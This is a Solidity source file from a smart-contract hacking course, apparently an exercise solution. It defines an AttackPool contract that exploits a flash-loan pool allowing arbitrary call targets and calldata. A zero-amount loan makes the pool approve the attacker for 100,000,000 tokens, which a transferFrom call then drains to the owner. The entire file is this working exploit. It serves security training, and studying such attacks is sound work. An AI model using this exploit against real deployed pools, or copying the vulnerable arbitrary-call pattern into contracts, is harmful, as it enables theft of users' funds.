// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

/**
 * @title Pool
 * @author JohnnyTime (https://smartcontractshacking.com)
 */

interface IPool {
    function requestFlashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract AttackPool {
    using Address for address;
    using SafeERC20 for IERC20;

    address public owner;
    address public ipool;
    address public token;

    constructor(address _ipool, address _token) {
        owner = msg.sender;
        ipool = _ipool;
        token = _token;
    }

    function attack() external {
        require(msg.sender == owner, "Only Owner");
        IPool(ipool).requestFlashLoan(
            0,
            address(this),
            token,
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                100000000 ether
            )
        );
        IERC20(token).transferFrom(ipool, owner, 100000000 ether);
    }
}
